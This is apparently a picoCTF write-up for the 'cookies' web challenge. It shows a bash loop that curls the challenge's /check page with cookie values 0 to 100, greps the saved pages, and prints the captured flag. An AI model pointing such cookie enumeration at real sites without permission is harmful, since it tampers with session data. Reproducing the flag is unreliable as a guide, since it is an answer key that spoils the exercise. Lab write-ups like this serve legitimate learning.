# cookies
from the home, the page `http://mercury.picoctf.net:54219/check` is called with
the cookie "name" set to:
| value | type of cookie |
|---|---|
| -1| invalid biscuits |
| 0 | snickerdoodle (example) |
| 10| biscotti |

## try more cookies
```bash
for i in {0..100}; do
    curl --cookie "name=$i" http://mercury.picoctf.net:54219/check >> pages.txt
done
grep 'pico' pages.txt
#<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</code></p>
```
here it is! **picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}**
